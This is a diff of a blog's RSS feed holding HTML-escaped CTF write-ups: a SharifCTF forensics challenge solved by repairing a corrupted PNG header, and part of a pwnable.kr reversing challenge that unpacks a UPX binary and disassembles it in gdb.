+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pictures&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;675&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Public&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Templates&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thunderbird&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Videos&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Xauthority&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7072&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xsession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7046&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xsession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As there’s nothing exciting in this process, let’s skip to the moment where in &lt;code class=&quot;highlighter-rouge&quot;&gt;.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/&lt;/code&gt; there were still trashed messages talking about uploaded file on filehosting.org&lt;/p&gt;
+
+&lt;p&gt;Piece of message from &lt;code class=&quot;highlighter-rouge&quot;&gt;Kosz&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;Trash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;filehosting.org | free easy unlimited filehosting&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-color: #2a2a2a; font: 12px Arial, sans-serif; padding: 10px;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width: 500px; margin: 0 auto;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-color: #4F4F4F; margin: 7px 0 0 7px;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-color: #FFFFFF; padding: 10px; position: relative; left: -7px; top: -7px;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;margin: 0 0 10px; font-weight: bold; font-size: 14px;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: #00BB00; text-decoration: none;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.filehosting.org&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;filehosting.org - Download&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;margin: 0 0 10px; font-size: 12px; border-bottom: 1px dashed #CCCCCC;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Thank you for using our service.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;dl&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line-height: 1.5em; margin: 0;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dt&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-decoration: underline; margin: 0 0 5px;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Download&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dt&amp;gt;&lt;/span&gt;
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;dd&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;margin: 10px 20px 10px; padding: 3px; background-color: #EEEEEE;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                        Download link for file &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;file&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;:
+                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;padding: 5px 0;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: #00BB00; text-decoration: none;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.filehosting.org/file/details/720884/Ncemd1SxbOVaOrbW/file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;http://www.filehosting.org/file/details/720884/Ncemd1SxbOVaOrbW/file&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+                        This download link is valid only once. This file can't be reused after downloading !
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/dd&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/dl&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;border-top: 1px dashed #CCCCCC; margin-top: 20px; padding-top: 3px; font-size: 10px; text-align: center;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+                    filehosting.org - upload, send, share and backup your files completely free!&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: #00BB00; text-decoration: none;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.filehosting.org/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;upload file&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;bull;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: #00BB00; text-decoration: none;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.filehosting.org/faq&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;FAQ&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;bull;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: #00BB00; text-decoration: none;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.filehosting.org/imprint&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;imprint&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After visiting the link we have to provide an email address in order to download the file. Instructions are clear, on the provided email we’ll get the download link.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/sharictf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file file
+file: data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That doesn’t tell much. Now I decided to take a look at the file using bless hex editor.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;89 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 03 E8 00 00 00 C8 04 03 00 00 00 89 C9 D6 7C 00 00 00 1B 50 4C 54 45 00 00 00 FF FF FF 5F 5F 5F 9F 9F 9F BF BF BF DF DF DF 7F 7F 7F 3F 3F 3F 1F 1F 1F AD A0 D6 E1 00 00 00 09 70 48 59 73 00 00 0E C4 00 00 0E C4 01 95 2B 0E 1B 00 00 0E FC 49 44 41 54 78&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you look closely, you’ll see slighlty broken &lt;strong&gt;&lt;em&gt;PNG&lt;/em&gt;&lt;/strong&gt; header which is &lt;code class=&quot;highlighter-rouge&quot;&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;. Let’s modify ours, by adding value &lt;code class=&quot;highlighter-rouge&quot;&gt;50&lt;/code&gt;, copying the whole hexdump from bless and creating a new file with the copied content.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sharifctf/client01-flag.png&quot; alt=&quot;Flag&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://apps.ubuntu.com/cat/applications/precise/bless/&quot;&gt;Bless Hex Editor&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.filesignatures.net/index.php?page=search&amp;amp;search=PNG&amp;amp;mode=EXT&quot;&gt;https://www.filesignatures.net/index.php?page=search&amp;amp;search=PNG&amp;amp;mode=EXT&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 03 Feb 2018 01:00:00 +0000</pubDate>
+        <link>http://localhost:4000/sharifctf-client01/</link>
+        <guid isPermaLink="true">http://localhost:4000/sharifctf-client01/</guid>
+      </item>
+    
+      <item>
         <title>Pwnable.kr - coin1</title>
         <description>&lt;p&gt;Let’s start with another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;coin1&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
 
@@ -774,242 +974,6 @@ Mommy, I thought libc random is unpredictable...&lt;/code&gt;&lt;/pre&gt;&lt;/fi
         <pubDate>Sun, 10 Dec 2017 08:00:00 +0000</pubDate>
         <link>http://localhost:4000/pwnable.kr-random/</link>
         <guid isPermaLink="true">http://localhost:4000/pwnable.kr-random/</guid>
-      </item>
-    
-      <item>
-        <title>Pwnable.kr - flag</title>
-        <description>&lt;p&gt;In order to keep this challenge streak alive, I decide to play with another one from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;flag&lt;/em&gt;&lt;/strong&gt;. This time our task is purely reverse enginnering, since we’re only given a binary, with no source code, no listening applications or ssh connections.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Papa brought me a packed present! let's open it.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I started analyzing by running a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command on the binary.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~/programming/pwnable.kr % file flag
-flag: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, stripped
-w3ndige@main ~/programming/pwnable.kr % ./flag
-I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It shows us that it’s a &lt;strong&gt;&lt;em&gt;stripped&lt;/em&gt;&lt;/strong&gt; binary. Running it only prints a message for us, telling how the code works  using high level interpretation.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % strings flag
-&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the UPX executable packer http://upx.sf.net &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$Id&lt;/span&gt;: UPX 3.08 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996-2011 the UPX Team. All Rights Reserved. &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; tool, I’ve noticed these lines - it’s packed with &lt;strong&gt;&lt;em&gt;UPX packer&lt;/em&gt;&lt;/strong&gt;. We can use &lt;code class=&quot;highlighter-rouge&quot;&gt;upx&lt;/code&gt; tool to unpack the binary into a more readable one. Let’s take a look.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;1 w3ndige@main ~/programming/pwnable.kr % upx &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; flag &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; flag_               :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
-                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
-                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2017
-UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   May 12th 2017
-
-        File size         Ratio      Format      Name
-   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-    883745 &amp;lt;-    335288   37.94%   linux/amd64   flag_
-
-Unpacked 1 file.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, now we’re ready to analyze it with &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~/programming/pwnable.kr % gdb flag_
-GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GDB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 8.0.1
-For &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Type &lt;span class=&quot;s2&quot;&gt;&quot;apropos word&quot;&lt;/span&gt; to search &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commands related to &lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;...
-Reading symbols from flag_...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disass main
-Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
-   0x0000000000401164 &amp;lt;+0&amp;gt;:	push   rbp
-   0x0000000000401165 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
-   0x0000000000401168 &amp;lt;+4&amp;gt;:	sub    rsp,0x10
-   0x000000000040116c &amp;lt;+8&amp;gt;:	mov    edi,0x496658
-   0x0000000000401171 &amp;lt;+13&amp;gt;:	call   0x402080 &amp;lt;puts&amp;gt;
-   0x0000000000401176 &amp;lt;+18&amp;gt;:	mov    edi,0x64
-   0x000000000040117b &amp;lt;+23&amp;gt;:	call   0x4099d0 &amp;lt;malloc&amp;gt;
-   0x0000000000401180 &amp;lt;+28&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],rax
-   0x0000000000401184 &amp;lt;+32&amp;gt;:	mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x2c0ee5]        &lt;span class=&quot;c&quot;&gt;# 0x6c2070 &amp;lt;flag&amp;gt;&lt;/span&gt;
-   0x000000000040118b &amp;lt;+39&amp;gt;:	mov    rax,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8]
-   0x000000000040118f &amp;lt;+43&amp;gt;:	mov    rsi,rdx
-   0x0000000000401192 &amp;lt;+46&amp;gt;:	mov    rdi,rax
-   0x0000000000401195 &amp;lt;+49&amp;gt;:	call   0x400320
